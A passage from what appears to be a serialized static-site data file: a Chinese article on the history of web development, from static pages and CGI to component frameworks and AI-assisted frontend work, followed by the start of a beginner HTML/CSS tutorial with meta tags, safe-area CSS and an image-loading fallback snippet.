静态网页\n\n纯粹HTML格式的网页通常被称为“静态网页”，静态网页是标准的HTML文件，它的文件扩展名是.htm、.html，可以包含文本、图像、声音、FLASH动画、客户端脚本和ActiveX控件及JAVA小程序等。静态网页是网站建设的基础，早期的网站一般都是由静态网页制作的。\n\n\n# 初期动态网页CGI\n\n1993年CGI（Common Gateway Interface）出现了，Web上的动态信息服务开始蓬勃兴起。CGI定义了Web服务器与外部应用程序之间的通信接口标准，因此Web服务器可以通过CGI执行外部程序，让外部程序根据Web请求内容生成动态的内容。Perl因为跨操作系统和易于修改的特性成为CGI的主要编写语言。当然，CGI可以用任何支持标准输入输出和环境变量的语言编写，比如Shell脚本,C/C++语言，只要符合接口标准即可。比如你用C语言编写CGI程序，你把希望返回的HTML内容通过printf输出就可以发送给Web服务器，进而返回给用户。\n\n## 动态网页PHP/JSP/ASP 1994年的时候，PHP诞生了，PHP可以把程序（动态内容）嵌入到HTML（模版）中去执行，不仅能更好的组织Web应用的内容，而且执行效率比CGI还更高。之后96年出现的ASP和98年出现的JSP本质上也都可以看成是一种支持某种脚本语言编程（分别是VB和Java）的模版引擎。\n\n随着动态网页技术发展，ASP、JSP、PHP等嵌入网页的脚本语言正被广泛使用，不过这些脚本要通过Web Server解释,而Html则被浏览器执行；\n\n## 分布式企业计算平台J2EE/.Net Web开始广泛用于构建大型应用时，在分布式、安全性、事务性等方面的要求催生了J2EE(现在已更名为Java EE)平台在1999年的诞生，从那时开始为企业应用提供支撑平台的各种应用服务器也开始大行其道。Java Servlet、Java Server Pages (JSP)和Enterprise Java Bean (EJB )是Java EE中的核心规范，Servlet和JSP是运行在服务器端的Web组件，EJB运行在服务器端的业务组件，是一种分布式组件技术。2000年随之而来的.net平台，其ASP.net构件化的Web开发方式以及Visual Stidio.net开发环境的强大支持，大大降低了开发企业应用的复杂度。ASP.Net第一次让程序员可以像拖拽组件来创建Windows Form程序那样来组件化地创建Web页面，Java平台后来出现的JSF也承袭了这一思想。两大平台在相互竞争和模仿中不断向前发展。\n\n\n# 框架时代MVC/ORM\n\n虽然脚本语言大大提高了应用开发效率，但是试想一个复杂的大型Web应用，访问各种功能的URL地址纷繁复杂，涉及到的Web页面多种多样，同时还管理着大量的后台数据，因此我们需要在架构层面上解决维护性和扩展性等问题。这个时候，MVC的概念被引入到Web开发中来了。2004年出现的Struts就是当时非常流行的Java Web开发的MVC框架。MVC早在1978年就作为Smalltalk的一种设计模式被提出来了，应用到Web应用上，模型Model用于封装与业务逻辑相关的数据和数据处理方法，视图View是数据的HTML展现，控制器Controller负责响应请求，协调Model和View。Model，View和Controller的分开，是一种典型的关注点分离的思想，不仅使得代码复用性和组织性更好，使得Web应用的配置性和灵活性更好。这是Spring MVC的示意图，典型的MVC架构。\n\n此外，数据访问也逐渐通过面向对象的方式来替代直接的SQL访问，出现了ORM（Object Relation Mapping）的概念，2001年出现的Hibernate就是其中的佼佼者，已经成为Java持久层的规范JPA的主要参考和实现。更多的全栈框架开始出现，比如2003年出现的Java开发框架Spring，同时更多的动态语言也被加入到Web编程语言的阵营中，2004年出现的Ruby开发框架Rails，2005出现的Python开发框架Django，都提供了全栈开发框架，或者自身提供Web开发的各种组件，或者可以方便的集成各种组件。比如Spring基于IoC和AOP思想可以方便得整合出全套Web开发组件，SSH（Struts+Spring+Hibernate）一度成为Java Web开发的标配。值得一提的时Rails这个MVC框架，26岁的丹麦大神David Heinemeier Hansson在开发著名项目管理软件BaseCamp的过程中形成，Ruby语言本身在快速开发上的优势，加上Rails诸如崇尚DRY（Don't）Repeat Yourself)原则, 约定优于配置，拥抱REST等特性，使其迅速成为一个极其流行的Web开发框架。\n\n## 客户端崛起时代Ajax/SPA > 今天，需要在单个页面之间切换的 Web 应用模式似乎过时了...\n\n历史滚滚往前，2004 年 Gmail 像风一样来到人间，很快 2005 年 Ajax 正式提出，加上 CDN 开始大量用于静态资源存储，于是出现了 JavaScript 王者归来的 SPA （Single Page Application 单页面应用）时代。\n\n这种模式下，前后端的分工非常清晰，前后端的关键协作点是 Ajax 接口。看起来是如此美妙，但回过头来看看的话，这与 JSP 时代区别不大。复杂度从服务端的 JSP 里移到了浏览器的 JavaScript，浏览器端变得很复杂。类似 Spring MVC，这个时代开始出现浏览器端的分层架构：\n\n对于 SPA 应用有几个很重要的挑战：\n\n\n# 前后端接口的约定。\n\n如果后端的接口一塌糊涂，业务模型不够稳定，那么前端开发会很痛苦。在项目中不少团队也有类似尝试，通过接口规则、接口平台等方式来做。有了和后端一起沉淀的接口规则，还可以用来模拟数据，使得前后端可以在约定接口后实现高效并行开发。相信这一块会越做越好。\n\n\n# 前端开发的复杂度控制。\n\nSPA 应用大多以功能交互型为主，JavaScript 代码过十万行很正常。大量 JS 代码的组织，与 View 层的绑定等，都不是容易的事情。典型的解决方案是业界的 Backbone，但 Backbone 做的事还很有限，依旧存在大量空白区域需要挑战。\n\n\n# 前端MVC Angular/Backbone\n\n为了降低前端开发复杂度，除了 Backbone，还有大量框架涌现，比如 EmberJS、KnockoutJS、AngularJS 等等。这些框架总的原则是先按类型分层，比如 view、controller、model。 好处很明显：\n\n前后端职责很清晰。前端工作在浏览器端，后端工作在服务端。清晰的分工，可以让开发并行，测试数据的模拟不难，前端可以本地开发。后端则可以专注于业务逻辑的处理，输出 RESTful 等接口。\n\n前端开发的复杂度可控。前端代码很重，但合理的分层，让前端代码能各司其职。\n\n部署相对独立，产品体验可以快速改进。\n\n\n# JavaScript在服务器端的逆袭 Node\n\n各大浏览器的竞争，使其引擎的性能不断提升，至今Google V8引擎的性能已经足以运行大型Javascript程序。在V8之上加以网络、文件系统等内置模块，形成了如今的Node.js。\n\n随着Node.js的出现，JavaScript开始拥有在服务端运行的能力，它的异步本质使得Node.js在处理I/O密集型业务中优势凸显，而大多Web业务中I/O性能都是瓶颈。eBay、Yahoo、甚至Microsoft Azure纷纷引入Node.js以提升性能。Node.js的package每天都有几千万的下载量。这对前端工程师来说可是一个好消息，精通JavaScript的他们也能够做服务端开发了！虽然现实中并不是这样美好（服务端开发涉及的不仅仅是语言层面），但一种新的开发模式也因此兴起：浏览器端处理展现层逻辑、而服务端Controller这一层以及相关的模板渲染、路由、数据接口以及Session/Cookie先关处理实际上交给了Nodejs来做。通过Nodejs, 意味着前后端很多代码可以复用（例如数据验证逻辑），在需要SEO的场景下也可以选择服务端模板渲染。\n\n\n# 前端组件化时代\n\n> 2013年，Facebook宣布推出React，引入了基于组件的架构。不久之后，大多数其他框架，如Vue、Angular，都选择组件化。\n\n差不多在2015年左右，我们的思维方式有个大跳变——从熟悉的 MVC 模式转组件化开发模式。\n\n组件化，给前端开发带来了极大的效率提升，是近几年以来web开发发展的趋势，各种组件化的用户界面库，框架也层出不穷，如，React，Vue，angular等，这些框架关于组件化都有各自的实现，推崇理念，与编程规范，各大框架的支持者之间的争论也是向来不断，而若想在不同框架间切换，成本还是挺高的，因为毕竟谁都希望自己能占主流，占据绝对优势地位，就像当前IE与网景浏览器之争，延续到现在，各类浏览器标准兼容差异万千，近年来w3c不断在为web标准规范做努力，Web Components就是推出的关于组件化的一个标准，希望它能将组件化更好的带进web开发，同时尽量保证标准规范，开发者可以更好的关注于开发，而不是框架选择与争论之上。\n\n\n# Web Components\n\nWeb Components它由四项主要技术组成，它们可以一起使用来创建封装功能的定制元素，可以在你喜欢的任何地方重用，不必担心代码冲突。 Web Components它本身不是一个规范，他是由W3C提出的另外4个规范的合集。这四个规范是：\n\n技术                       说明\nCustom elements（自定义元素）   一组JavaScript API，允许您定义custom\n                         elements及其行为，然后可以在您的用户界面中按照需要使用它们。\nShadow DOM（影子DOM）        一组JavaScript\n                         API，用于将封装的“影子”DOM树附加到元素（与主文档DOM分开呈现）并控制其关联的功能。通过这种方式，您可以保持元素的功能私有，这样它们就可以被脚本化和样式化，而不用担心与文档的其他部分发生冲突。\nHTML templates（HTML模板）   <template> 和 <slot>\n                         元素使您可以编写不在呈现页面中显示的标记模板。然后它们可以作为自定义元素结构的基础被多次重用。\nHTML Imports（HTML导入）     一旦定义了自定义组件，最简单的重用它的方法就是使其定义细节保存在一个单独的文件中，然后使用导入机制将其导入到想要实际使用它的页面中。HTML\n                         导入就是这样一种机制，尽管存在争议 — Mozilla 根本不同意这种方法，并打算在将来实现更合适的。\n\n总体来说，Web component他是w3c标准，基本会是组件技术的最终方向，但是需要大量的时间来让来让浏览器支持(点击查看兼容情况)。\n\n\n# 未来：前端智能化\n\n前端目前的生产工艺还是人工的，即便有一定的程度的 lowcode 产品手段来辅助前端释放生产压力，但还是解决不了供不应求的问题，所以没有别的办法，只有一条路就是去人工，改成完全自动化的生产手段，只有让供给能力远远超越需求的市场增长指数，那么才能彻底解决供不应求的问题。\n\n那么，前端该如何将生产手段提升到自动化阶段呢？\n首先，我们能想到的生产手段上肯定不能重度依赖人，那么剩下的也仅有机器，对于我们而言，肯定就是计算机了。\n\n长远来看，前端 + AI 的这种前端智能化方向肯定是持续存在的，前端也会因为 AI 能力的加入，会产生诸多不一样的生产力变化。这种变化可能是阶段性的，也可能是终极的，总之生产力会慢慢向计算机身上过渡，前端做的工作是驱动这一切的更深层工作。这个方向没有退路，也绕不过去。",normalizedContent:"# web开发发展史\n\n了解一下web开发相关的历史，相关技术的演进历程，知其前世今生，非常有助于加深web开发相关技术的理解和认识。\n\n从静态页面到javascript，从依赖后端到自主开发，前端开发者从不被重视的“页面仔”逆袭为如今很多前端工程师的薪资比后端还高，从前端技术由国外开发者主导到如今国内自主产生的小程序技术，我们走了 20 年。\n\n1990 年，第一个web浏览器诞生，而www的诞生直接拉开前端史的序幕。本文从最初的静态网页到cgi、php/jsp/asp、分布式企业计算平台j2ee/.net、框架时代、ajax、前端mvc、nodejs、组件化、智能化的这个过程进行简要的介绍。\n\n\n# 静态网页\n\n纯粹html格式的网页通常被称为“静态网页”，静态网页是标准的html文件，它的文件扩展名是.htm、.html，可以包含文本、图像、声音、flash动画、客户端脚本和activex控件及java小程序等。静态网页是网站建设的基础，早期的网站一般都是由静态网页制作的。\n\n\n# 初期动态网页cgi\n\n1993年cgi（common gateway interface）出现了，web上的动态信息服务开始蓬勃兴起。cgi定义了web服务器与外部应用程序之间的通信接口标准，因此web服务器可以通过cgi执行外部程序，让外部程序根据web请求内容生成动态的内容。perl因为跨操作系统和易于修改的特性成为cgi的主要编写语言。当然，cgi可以用任何支持标准输入输出和环境变量的语言编写，比如shell脚本,c/c++语言，只要符合接口标准即可。比如你用c语言编写cgi程序，你把希望返回的html内容通过printf输出就可以发送给web服务器，进而返回给用户。\n\n## 动态网页php/jsp/asp 1994年的时候，php诞生了，php可以把程序（动态内容）嵌入到html（模版）中去执行，不仅能更好的组织web应用的内容，而且执行效率比cgi还更高。之后96年出现的asp和98年出现的jsp本质上也都可以看成是一种支持某种脚本语言编程（分别是vb和java）的模版引擎。\n\n随着动态网页技术发展，asp、jsp、php等嵌入网页的脚本语言正被广泛使用，不过这些脚本要通过web server解释,而html则被浏览器执行；\n\n## 分布式企业计算平台j2ee/.net web开始广泛用于构建大型应用时，在分布式、安全性、事务性等方面的要求催生了j2ee(现在已更名为java ee)平台在1999年的诞生，从那时开始为企业应用提供支撑平台的各种应用服务器也开始大行其道。java servlet、java server pages (jsp)和enterprise java bean (ejb )是java ee中的核心规范，servlet和jsp是运行在服务器端的web组件，ejb运行在服务器端的业务组件，是一种分布式组件技术。2000年随之而来的.net平台，其asp.net构件化的web开发方式以及visual stidio.net开发环境的强大支持，大大降低了开发企业应用的复杂度。asp.net第一次让程序员可以像拖拽组件来创建windows form程序那样来组件化地创建web页面，java平台后来出现的jsf也承袭了这一思想。两大平台在相互竞争和模仿中不断向前发展。\n\n\n# 框架时代mvc/orm\n\n虽然脚本语言大大提高了应用开发效率，但是试想一个复杂的大型web应用，访问各种功能的url地址纷繁复杂，涉及到的web页面多种多样，同时还管理着大量的后台数据，因此我们需要在架构层面上解决维护性和扩展性等问题。这个时候，mvc的概念被引入到web开发中来了。2004年出现的struts就是当时非常流行的java web开发的mvc框架。mvc早在1978年就作为smalltalk的一种设计模式被提出来了，应用到web应用上，模型model用于封装与业务逻辑相关的数据和数据处理方法，视图view是数据的html展现，控制器controller负责响应请求，协调model和view。model，view和controller的分开，是一种典型的关注点分离的思想，不仅使得代码复用性和组织性更好，使得web应用的配置性和灵活性更好。这是spring mvc的示意图，典型的mvc架构。\n\n此外，数据访问也逐渐通过面向对象的方式来替代直接的sql访问，出现了orm（object relation mapping）的概念，2001年出现的hibernate就是其中的佼佼者，已经成为java持久层的规范jpa的主要参考和实现。更多的全栈框架开始出现，比如2003年出现的java开发框架spring，同时更多的动态语言也被加入到web编程语言的阵营中，2004年出现的ruby开发框架rails，2005出现的python开发框架django，都提供了全栈开发框架，或者自身提供web开发的各种组件，或者可以方便的集成各种组件。比如spring基于ioc和aop思想可以方便得整合出全套web开发组件，ssh（struts+spring+hibernate）一度成为java web开发的标配。值得一提的时rails这个mvc框架，26岁的丹麦大神david heinemeier hansson在开发著名项目管理软件basecamp的过程中形成，ruby语言本身在快速开发上的优势，加上rails诸如崇尚dry（don't）repeat yourself)原则, 约定优于配置，拥抱rest等特性，使其迅速成为一个极其流行的web开发框架。\n\n## 客户端崛起时代ajax/spa > 今天，需要在单个页面之间切换的 web 应用模式似乎过时了...\n\n历史滚滚往前，2004 年 gmail 像风一样来到人间，很快 2005 年 ajax 正式提出，加上 cdn 开始大量用于静态资源存储，于是出现了 javascript 王者归来的 spa （single page application 单页面应用）时代。\n\n这种模式下，前后端的分工非常清晰，前后端的关键协作点是 ajax 接口。看起来是如此美妙，但回过头来看看的话，这与 jsp 时代区别不大。复杂度从服务端的 jsp 里移到了浏览器的 javascript，浏览器端变得很复杂。类似 spring mvc，这个时代开始出现浏览器端的分层架构：\n\n对于 spa 应用有几个很重要的挑战：\n\n\n# 前后端接口的约定。\n\n如果后端的接口一塌糊涂，业务模型不够稳定，那么前端开发会很痛苦。在项目中不少团队也有类似尝试，通过接口规则、接口平台等方式来做。有了和后端一起沉淀的接口规则，还可以用来模拟数据，使得前后端可以在约定接口后实现高效并行开发。相信这一块会越做越好。\n\n\n# 前端开发的复杂度控制。\n\nspa 应用大多以功能交互型为主，javascript 代码过十万行很正常。大量 js 代码的组织，与 view 层的绑定等，都不是容易的事情。典型的解决方案是业界的 backbone，但 backbone 做的事还很有限，依旧存在大量空白区域需要挑战。\n\n\n# 前端mvc angular/backbone\n\n为了降低前端开发复杂度，除了 backbone，还有大量框架涌现，比如 emberjs、knockoutjs、angularjs 等等。这些框架总的原则是先按类型分层，比如 view、controller、model。 好处很明显：\n\n前后端职责很清晰。前端工作在浏览器端，后端工作在服务端。清晰的分工，可以让开发并行，测试数据的模拟不难，前端可以本地开发。后端则可以专注于业务逻辑的处理，输出 restful 等接口。\n\n前端开发的复杂度可控。前端代码很重，但合理的分层，让前端代码能各司其职。\n\n部署相对独立，产品体验可以快速改进。\n\n\n# javascript在服务器端的逆袭 node\n\n各大浏览器的竞争，使其引擎的性能不断提升，至今google v8引擎的性能已经足以运行大型javascript程序。在v8之上加以网络、文件系统等内置模块，形成了如今的node.js。\n\n随着node.js的出现，javascript开始拥有在服务端运行的能力，它的异步本质使得node.js在处理i/o密集型业务中优势凸显，而大多web业务中i/o性能都是瓶颈。ebay、yahoo、甚至microsoft azure纷纷引入node.js以提升性能。node.js的package每天都有几千万的下载量。这对前端工程师来说可是一个好消息，精通javascript的他们也能够做服务端开发了！虽然现实中并不是这样美好（服务端开发涉及的不仅仅是语言层面），但一种新的开发模式也因此兴起：浏览器端处理展现层逻辑、而服务端controller这一层以及相关的模板渲染、路由、数据接口以及session/cookie先关处理实际上交给了nodejs来做。通过nodejs, 意味着前后端很多代码可以复用（例如数据验证逻辑），在需要seo的场景下也可以选择服务端模板渲染。\n\n\n# 前端组件化时代\n\n> 2013年，facebook宣布推出react，引入了基于组件的架构。不久之后，大多数其他框架，如vue、angular，都选择组件化。\n\n差不多在2015年左右，我们的思维方式有个大跳变——从熟悉的 mvc 模式转组件化开发模式。\n\n组件化，给前端开发带来了极大的效率提升，是近几年以来web开发发展的趋势，各种组件化的用户界面库，框架也层出不穷，如，react，vue，angular等，这些框架关于组件化都有各自的实现，推崇理念，与编程规范，各大框架的支持者之间的争论也是向来不断，而若想在不同框架间切换，成本还是挺高的，因为毕竟谁都希望自己能占主流，占据绝对优势地位，就像当前ie与网景浏览器之争，延续到现在，各类浏览器标准兼容差异万千，近年来w3c不断在为web标准规范做努力，web components就是推出的关于组件化的一个标准，希望它能将组件化更好的带进web开发，同时尽量保证标准规范，开发者可以更好的关注于开发，而不是框架选择与争论之上。\n\n\n# web components\n\nweb components它由四项主要技术组成，它们可以一起使用来创建封装功能的定制元素，可以在你喜欢的任何地方重用，不必担心代码冲突。 web components它本身不是一个规范，他是由w3c提出的另外4个规范的合集。这四个规范是：\n\n技术                       说明\ncustom elements（自定义元素）   一组javascript api，允许您定义custom\n                         elements及其行为，然后可以在您的用户界面中按照需要使用它们。\nshadow dom（影子dom）        一组javascript\n                         api，用于将封装的“影子”dom树附加到元素（与主文档dom分开呈现）并控制其关联的功能。通过这种方式，您可以保持元素的功能私有，这样它们就可以被脚本化和样式化，而不用担心与文档的其他部分发生冲突。\nhtml templates（html模板）   <template> 和 <slot>\n                         元素使您可以编写不在呈现页面中显示的标记模板。然后它们可以作为自定义元素结构的基础被多次重用。\nhtml imports（html导入）     一旦定义了自定义组件，最简单的重用它的方法就是使其定义细节保存在一个单独的文件中，然后使用导入机制将其导入到想要实际使用它的页面中。html\n                         导入就是这样一种机制，尽管存在争议 — mozilla 根本不同意这种方法，并打算在将来实现更合适的。\n\n总体来说，web component他是w3c标准，基本会是组件技术的最终方向，但是需要大量的时间来让来让浏览器支持(点击查看兼容情况)。\n\n\n# 未来：前端智能化\n\n前端目前的生产工艺还是人工的，即便有一定的程度的 lowcode 产品手段来辅助前端释放生产压力，但还是解决不了供不应求的问题，所以没有别的办法，只有一条路就是去人工，改成完全自动化的生产手段，只有让供给能力远远超越需求的市场增长指数，那么才能彻底解决供不应求的问题。\n\n那么，前端该如何将生产手段提升到自动化阶段呢？\n首先，我们能想到的生产手段上肯定不能重度依赖人，那么剩下的也仅有机器，对于我们而言，肯定就是计算机了。\n\n长远来看，前端 + ai 的这种前端智能化方向肯定是持续存在的，前端也会因为 ai 能力的加入，会产生诸多不一样的生产力变化。这种变化可能是阶段性的，也可能是终极的，总之生产力会慢慢向计算机身上过渡，前端做的工作是驱动这一切的更深层工作。这个方向没有退路，也绕不过去。",charsets:{cjk:!0}},{title:"一. 网站开发流程",frontmatter:{},regularPath:"/web/HtmlCss/HtmlCss.html",relativePath:"web/HtmlCss/HtmlCss.md",key:"v-e2a5b0dc",path:"/web/HtmlCss/HtmlCss.html",headers:[{level:2,title:"一. 网站开发流程",slug:"一-网站开发流程",normalizedTitle:"一. 网站开发流程",charIndex:2},{level:2,title:"二、开发工具",slug:"二、开发工具",normalizedTitle:"二、开发工具",charIndex:78},{level:2,title:"各种兼容的meta",slug:"各种兼容的meta",normalizedTitle:"各种兼容的meta",charIndex:98},{level:2,title:". 适配iPhoneX",slug:"适配iphonex",normalizedTitle:". 适配iphonex",charIndex:357},{level:2,title:"二、HTML",slug:"二、html",normalizedTitle:"二、html",charIndex:1513},{level:3,title:"1. 什么是html?",slug:"_1-什么是html",normalizedTitle:"1. 什么是html?",charIndex:1524},{level:3,title:"2. html框架",slug:"_2-html框架",normalizedTitle:"2. html框架",charIndex:1564},{level:3,title:"3. 注释",slug:"_3-注释",normalizedTitle:"3. 注释",charIndex:1830},{level:3,title:"4. 语法",slug:"_4-语法",normalizedTitle:"4. 语法",charIndex:1857},{level:3,title:"5. 常用标签介绍",slug:"_5-常用标签介绍",normalizedTitle:"5. 常用标签介绍",charIndex:1882},{level:3,title:"6. 标签的分类",slug:"_6-标签的分类",normalizedTitle:"6. 标签的分类",charIndex:3378},{level:3,title:"7. 路径问题",slug:"_7-路径问题",normalizedTitle:"7. 路径问题",charIndex:3690},{level:2,title:"三、css",slug:"三、css",normalizedTitle:"三、css",charIndex:3921},{level:3,title:"1. 什么是css?",slug:"_1-什么是css",normalizedTitle:"1. 什么是css?",charIndex:3931},{level:3,title:"2. 语法",slug:"_2-语法",normalizedTitle:"2. 语法",charIndex:3968},{level:3,title:"3. css引入方式",slug:"_3-css引入方式",normalizedTitle:"3. css引入方式",charIndex:4092},{level:3,title:"4. 选择器",slug:"_4-选择器",normalizedTitle:"4. 选择器",charIndex:4525},{level:3,title:"计算器",slug:"计算器",normalizedTitle:"计算器",charIndex:6325},{level:3,title:"5. 文字属性",slug:"_5-文字属性",normalizedTitle:"5. 文字属性",charIndex:6341},{level:3,title:"6. 颜色的表示方法",slug:"_6-颜色的表示方法",normalizedTitle:"6. 颜色的表示方法",charIndex:8212},{level:2,title:"四、盒子模型",slug:"四、盒子模型",normalizedTitle:"四、盒子模型",charIndex:8539},{level:3,title:"1. 组成：",slug:"_1-组成",normalizedTitle:"1. 组成：",charIndex:8577},{level:3,title:"2. 内容",slug:"_2-内容",normalizedTitle:"2. 内容",charIndex:8628},{level:3,title:"3.padding(内填充)",slug:"_3-padding-内填充",normalizedTitle:"3.padding(内填充)",charIndex:8642},{level:3,title:"4.border(边框)",slug:"_4-border-边框",normalizedTitle:"4.border(边框)",charIndex:9077},{level:3,title:"5.margin(外间距)",slug:"_5-margin-外间距",normalizedTitle:"5.margin(外间距)",charIndex:9413},{level:2,title:"五、浮动",slug:"五、浮动",normalizedTitle:"五、浮动",charIndex:10289},{level:3,title:"1. 什么时候使用？",slug:"_1-什么时候使用",normalizedTitle:"1. 什么时候使用？",charIndex:10298},{level:3,title:"2. 浮动分类",slug:"_2-浮动分类",normalizedTitle:"2. 浮动分类",charIndex:10325},{level:3,title:"3. 浮动什么时候停止?",slug:"_3-浮动什么时候停止",normalizedTitle:"3. 浮动什么时候停止?",charIndex:10379},{level:3,title:"4. 卡顿",slug:"_4-卡顿",normalizedTitle:"4. 卡顿",charIndex:10434},{level:3,title:"5. 注意",slug:"_5-注意",normalizedTitle:"5. 注意",charIndex:10533},{level:2,title:"补充",slug:"补充",normalizedTitle:"补充",charIndex:10826},{level:2,title:"六、定位",slug:"六、定位",normalizedTitle:"六、定位",charIndex:11058},{level:3,title:"1. 什么时候用？",slug:"_1-什么时候用",normalizedTitle:"1. 什么时候用？",charIndex:11067},{level:3,title:"2. 定位是什么？",slug:"_2-定位是什么",normalizedTitle:"2. 定位是什么？",charIndex:11113},{level:3,title:"3. 定位分类",slug:"_3-定位分类",normalizedTitle:"3. 定位分类",charIndex:11158},{level:2,title:"·补充内容介绍",slug:"·补充内容介绍",normalizedTitle:"·补充内容介绍",charIndex:12641},{level:2,title:"七、渐变",slug:"七、渐变",normalizedTitle:"七、渐变",charIndex:13970},{level:2,title:"九、 语义化标签（html5）",slug:"九、-语义化标签-html5",normalizedTitle:"九、 语义化标签（html5）",charIndex:15320},{level:2,title:"十，背景图片",slug:"十-背景图片",normalizedTitle:"十，背景图片",charIndex:16641},{level:2,title:"十一、 响应式布局",slug:"十一、-响应式布局",normalizedTitle:"十一、 响应式布局",charIndex:17561},{level:2,title:"十二、移动端布局准备工作",slug:"十二、移动端布局准备工作",normalizedTitle:"十二、移动端布局准备工作",charIndex:17955},{level:2,title:"十三弹性布局",slug:"十三弹性布局",normalizedTitle:"十三弹性布局",charIndex:19028},{level:3,title:"1. 概念",slug:"_1-概念",normalizedTitle:"1. 概念",charIndex:19039},{level:3,title:"2. 容器（写在父元素身上）的属性",slug:"_2-容器-写在父元素身上-的属性",normalizedTitle:"2. 容器（写在父元素身上）的属性",charIndex:19155},{level:3,title:"3. 项目（写在子元素身上）的属性",slug:"_3-项目-写在子元素身上-的属性",normalizedTitle:"3. 项目（写在子元素身上）的属性",charIndex:19766},{level:2,title:"十四、表单from",slug:"十四、表单from",normalizedTitle:"十四、表单from",charIndex:20188},{level:3,title:"滚动条",slug:"滚动条",normalizedTitle:"滚动条",charIndex:12767},{level:3,title:"table",slug:"table",normalizedTitle:"table",charIndex:22593},{level:2,title:"容易混淆的几个css属性",slug:"容易混淆的几个css属性",normalizedTitle:"容易混淆的几个css属性",charIndex:24317}],headersStr:"一. 网站开发流程 二、开发工具 各种兼容的meta . 适配iPhoneX 二、HTML 1. 什么是html? 2. html框架 3. 注释 4. 语法 5. 常用标签介绍 6. 标签的分类 7. 路径问题 三、css 1. 什么是css? 2. 语法 3. css引入方式 4. 选择器 计算器 5. 文字属性 6. 颜色的表示方法 四、盒子模型 1. 组成： 2. 内容 3.padding(内填充) 4.border(边框) 5.margin(外间距) 五、浮动 1. 什么时候使用？ 2. 浮动分类 3. 浮动什么时候停止? 4. 卡顿 5. 注意 补充 六、定位 1. 什么时候用？ 2. 定位是什么？ 3. 定位分类 ·补充内容介绍 七、渐变 九、 语义化标签（html5） 十，背景图片 十一、 响应式布局 十二、移动端布局准备工作 十三弹性布局 1. 概念 2. 容器（写在父元素身上）的属性 3. 项目（写在子元素身上）的属性 十四、表单from 滚动条 table 容易混淆的几个css属性",content:'# 一. 网站开发流程\n\n 1. 项目规划\n 2. 平台规划\n 3. 程序开发\n    * 前端web开发\n    * 后端开发\n 4. 网站测试\n\n\n# 二、开发工具\n\n编辑器、浏览器\n\n\n# 各种兼容的meta\n\n\n  \x3c!-- 兼容ie --\x3e\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    \x3c!-- 高速渲染页面 --\x3e\n    <meta name="renderer" content="webkit">\n\n    \x3c!-- seo:提高搜索度 --\x3e\n    <meta name="keywords" content="">\n\n    <meta name="description" content="">\n\n\n\n# . 适配iPhoneX\n\n> 我们需要将顶部和底部合理的摆放在安全区域内，iOS11新增了两个CSS函数env、constant，用于设定安全区域与边界的距离。\n\n函数内部可以是四个常量：\n\n\nsafe-area-inset-left：安全区域距离左边边界距离\nsafe-area-inset-right：安全区域距离右边边界距离\nsafe-area-inset-top：安全区域距离顶部边界距离\nsafe-area-inset-bottom：安全区域距离底部边界距离\n\n\nWARNING\n\n * 注意：我们必须指定viweport-fit后才能使用这两个函数：\n\n\n<meta name="viewport" content="width=device-width, viewport-fit=cover">\n复制代码\nconstant在iOS < 11.2的版本中生效，env在iOS >= 11.2的版本中生效，这意味着我们往往要同时设置他们，将页面限制在安全区域内：\nbody {\n  padding-bottom: constant(safe-area-inset-bottom);\n  padding-bottom: env(safe-area-inset-bottom);\n}\n\n当使用底部固定导航栏时，我们要为他们设置padding值：\n{\n  padding-bottom: constant(safe-area-inset-bottom);\n  padding-bottom: env(safe-area-inset-bottom);\n}\n\n具体细节\naotu.io/notes/2017/…\n4.关于横屏\njs识别\nwindow.addEventListener("resize", ()=>{\n    if (window.orientation === 180 || window.orientation === 0) { \n      // 正常方向或屏幕旋转180度\n        console.log(\'竖屏\');\n    };\n    if (window.orientation === 90 || window.orientation === -90 ){ \n       // 屏幕顺时钟旋转90度或屏幕逆时针旋转90度\n        console.log(\'横屏\');\n    }  \n});\n复制代码\ncss识别\n@media screen and (orientation: portrait) {\n  /*竖屏...*/\n} \n@media screen and (orientation: landscape) {\n  /*横屏...*/\n}\n\n\n\n# 二、HTML\n\n\n# 1. 什么是html?\n\n> 中文：超文本标记语言，由浏览器解释执行。\n\n\n# 2. html框架\n\n\x3c!-- html版本号 ,告诉浏览器以某个(html5)版本解释执行该html文件--\x3e\n<!DOCTYPE html>\n<html>\n\x3c!--头部标签--\x3e\n\n<head>\n    \x3c!-- 当前页面的字符编码格式，防止中文乱码 --\x3e\n    <meta charset="utf-8" />\n    <title>标题部分</title>\n</head>\n\x3c!--会经常编辑的标签，页面的结构全部都写在body里面--\x3e\n\n<body>\n    写主体部分\n</body>\n\n</html>\n\n\n\n# 3. 注释\n\nctrl+/ 作用：使代码无效\n\n\n# 4. 语法\n\n<标签名>内容</标签名>\n\n\n# 5. 常用标签介绍\n\n 1. div\n    \n    \n    .box{}\n\n    <div>这是一个div标签</div>\n\n\n 2. 图片标签\n    \n    \n    .box{}\n\n    <img src="a.jpg" title="图片的标题" alt="图片找不到">\n\n\n- `src`=>引入图片的内容\n- `title`=>鼠标移入，图片设置的标题\n- `alt`=>图片加载失败，找不到时显示的内容\n\n\n 3. 超链接标签\n    \n    \n    .box{}\n\n    <a href="https://www.baidu.com" target="_self" title="点我跳转">点我</a>\n\n\n- href=>跳转页面的地址\n- target=>跳转的方式\n    - _blank: 在新的窗口跳转\n    - _self:(默认)在当前窗口打开\n- title=>鼠标移入提示的内容\n\n\n\n其实可以利用<img>图片标签的onerror事件对其处理的，要求其加载失败之后，马上加载一张默认图片，而不是显示为红叉叉。\n\n其代码如下：\n\n[html] view plain copy\n<img src="s.png" onerror="javascript:this.src=\'xx.png\';this.width=80;this.height=80;" />  \n意为，如果加载s.png这张图片失败了，就马上去加载xx.png这张图片，同时xx.png这张图片要求其以80x80的方式加载。\n当然，如果你要设置更多属性，完全可以写成这样：\n\n[html] view plain copy\n<img src="s.png" onerror="onErrorHandle(this)" />  \n声明这个s.png加载失败的javascript处理函数是onErrorHandle，然后把自己，也就是这个img节点传过去，\n然后在javascript中写一个这样的onErrorHandle函数：\n\n[javascript] view plain copy\nfunction onErrorHandle(obj){  \n    obj.src="xx.png";  \n    obj.width=80;  \n    obj.height=80;  \n    }  \nxx.png。\n但问题来了，如果xx.png 也不存在，则继续触发 onerror，导致循环，故会出现打开网页时提示 Stack overflow at line: 0错误。\n特别说明：如果图片存在，但网络很不通畅，也可能触发 onerror。\n解决方法：\n第一种：去掉 onerror 代码；或者更改 onerror 代码为其它；或者确保 onerror 中的图片足够小，并且容易加载而存在。\n第二种：控制它不循环，代码如下：\n<script 